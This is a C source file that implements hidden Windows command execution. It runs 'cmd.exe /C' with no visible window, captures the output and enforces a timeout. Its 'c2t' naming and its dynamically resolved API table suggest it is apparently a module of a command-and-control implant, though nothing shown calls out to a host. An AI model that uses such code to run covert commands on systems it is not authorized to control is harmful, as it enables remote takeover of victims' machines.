/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#ifdef _WIN32

#include "shell_windows.h"
#include "../logging/logging.h"
#include "../win32/win32_api.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int c2t_shell_windows_execute(const char *command, c2t_shell_result_t *result,
                              uint32_t timeout_ms) {
  if (!command || !result)
    return 0;

  memset(result, 0, sizeof(*result));
  if (timeout_ms == 0) {
    timeout_ms = C2T_SHELL_DEFAULT_TIMEOUT_MS;
  }

  c2t_win32_api_init();

  if (!g_c2t_win32.CreateProcessA || !g_c2t_win32.CreatePipe ||
      !g_c2t_win32.ReadFile || !g_c2t_win32.CloseHandle ||
      !g_c2t_win32.WaitForSingleObject) {
    c2t_log_error("shell", "Required Windows APIs unavailable for shell execution");
    result->execution_error = 1;
    return 0;
  }

  SECURITY_ATTRIBUTES sa;
  memset(&sa, 0, sizeof(sa));
  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.bInheritHandle = TRUE;
  sa.lpSecurityDescriptor = NULL;

  HANDLE hReadPipe = NULL;
  HANDLE hWritePipe = NULL;
  if (!g_c2t_win32.CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
    c2t_log_error("shell", "Failed to create anonymous pipe: %lu",
                  (unsigned long)(g_c2t_win32.GetLastError ? g_c2t_win32.GetLastError() : 0));
    result->execution_error = 1;
    return 0;
  }

  if (g_c2t_win32.SetHandleInformation) {
    g_c2t_win32.SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
  }

  size_t cmd_len = strlen(command);
  size_t full_cmd_len = cmd_len + 32;
  char *full_cmd = malloc(full_cmd_len);
  if (!full_cmd) {
    g_c2t_win32.CloseHandle(hReadPipe);
    g_c2t_win32.CloseHandle(hWritePipe);
    result->execution_error = 1;
    return 0;
  }
  snprintf(full_cmd, full_cmd_len, "cmd.exe /C %s", command);

  STARTUPINFOA si;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdOutput = hWritePipe;
  si.hStdError = hWritePipe;
  si.hStdInput = NULL;

  PROCESS_INFORMATION pi;
  memset(&pi, 0, sizeof(pi));

  uint64_t start_time = g_c2t_win32.GetTickCount64 ? g_c2t_win32.GetTickCount64() : 0;

  BOOL created = g_c2t_win32.CreateProcessA(
      NULL, full_cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

  free(full_cmd);
  g_c2t_win32.CloseHandle(hWritePipe);

  if (!created) {
    c2t_log_error("shell", "Failed to launch process: %lu",
                  (unsigned long)(g_c2t_win32.GetLastError ? g_c2t_win32.GetLastError() : 0));
    g_c2t_win32.CloseHandle(hReadPipe);
    result->execution_error = 1;
    return 0;
  }

  size_t capacity = 4096;
  char *buffer = malloc(capacity);
  if (!buffer) {
    g_c2t_win32.CloseHandle(hReadPipe);
    if (g_c2t_win32.TerminateProcess)
      g_c2t_win32.TerminateProcess(pi.hProcess, 1);
    g_c2t_win32.CloseHandle(pi.hThread);
    g_c2t_win32.CloseHandle(pi.hProcess);
    result->execution_error = 1;
    return 0;
  }
  size_t total_read = 0;
  buffer[0] = '\0';

  int running = 1;
  int timed_out = 0;

  while (running) {
    uint64_t now = g_c2t_win32.GetTickCount64 ? g_c2t_win32.GetTickCount64() : 0;
    if (now - start_time >= (uint64_t)timeout_ms) {
      timed_out = 1;
      break;
    }

    DWORD bytes_avail = 0;
    if (g_c2t_win32.PeekNamedPipe) {
      if (g_c2t_win32.PeekNamedPipe(hReadPipe, NULL, 0, NULL, &bytes_avail, NULL)) {
        if (bytes_avail > 0) {
          char chunk[1024];
          DWORD to_read = (DWORD)(bytes_avail < sizeof(chunk) ? bytes_avail : sizeof(chunk));
          DWORD bytes_read = 0;
          if (g_c2t_win32.ReadFile(hReadPipe, chunk, to_read, &bytes_read, NULL) && bytes_read > 0) {
            if (total_read + bytes_read < C2T_SHELL_MAX_OUTPUT_BYTES) {
              if (total_read + bytes_read + 1 > capacity) {
                size_t new_cap = capacity * 2;
                while (new_cap < total_read + bytes_read + 1)
                  new_cap *= 2;
                char *new_buf = realloc(buffer, new_cap);
                if (new_buf) {
                  buffer = new_buf;
                  capacity = new_cap;
                }
              }
              if (total_read + bytes_read + 1 <= capacity) {
                memcpy(buffer + total_read, chunk, bytes_read);
                total_read += bytes_read;
                buffer[total_read] = '\0';
              }
            }
            continue;
          }
        }
      }
    }

    DWORD wait_res = g_c2t_win32.WaitForSingleObject(pi.hProcess, 50);
    if (wait_res == WAIT_OBJECT_0) {
      /* Drain remaining data */
      DWORD bytes_read = 0;
      char chunk[1024];
      while (g_c2t_win32.ReadFile(hReadPipe, chunk, sizeof(chunk), &bytes_read, NULL) && bytes_read > 0) {
        if (total_read + bytes_read < C2T_SHELL_MAX_OUTPUT_BYTES) {
          if (total_read + bytes_read + 1 > capacity) {
            size_t new_cap = capacity * 2;
            while (new_cap < total_read + bytes_read + 1)
              new_cap *= 2;
            char *new_buf = realloc(buffer, new_cap);
            if (new_buf) {
              buffer = new_buf;
              capacity = new_cap;
            }
          }
          if (total_read + bytes_read + 1 <= capacity) {
            memcpy(buffer + total_read, chunk, bytes_read);
            total_read += bytes_read;
            buffer[total_read] = '\0';
          }
        }
      }
      running = 0;
      break;
    }
  }

  g_c2t_win32.CloseHandle(hReadPipe);

  if (timed_out) {
    result->timed_out = 1;
    result->exit_code = -1;
    c2t_log_warning("shell", "Command timed out after %u ms, terminating process", timeout_ms);
    if (g_c2t_win32.TerminateProcess) {
      g_c2t_win32.TerminateProcess(pi.hProcess, 1);
      g_c2t_win32.WaitForSingleObject(pi.hProcess, 1000);
    }
  } else {
    DWORD exit_code = 0;
    if (g_c2t_win32.GetExitCodeProcess && g_c2t_win32.GetExitCodeProcess(pi.hProcess, &exit_code)) {
      result->exit_code = (int)exit_code;
    }
  }

  g_c2t_win32.CloseHandle(pi.hThread);
  g_c2t_win32.CloseHandle(pi.hProcess);

  uint64_t end_time = g_c2t_win32.GetTickCount64 ? g_c2t_win32.GetTickCount64() : 0;
  result->duration_ms = end_time - start_time;
  result->output = buffer;
  result->output_len = total_read;

  return 1;
}

#endif /* _WIN32 */
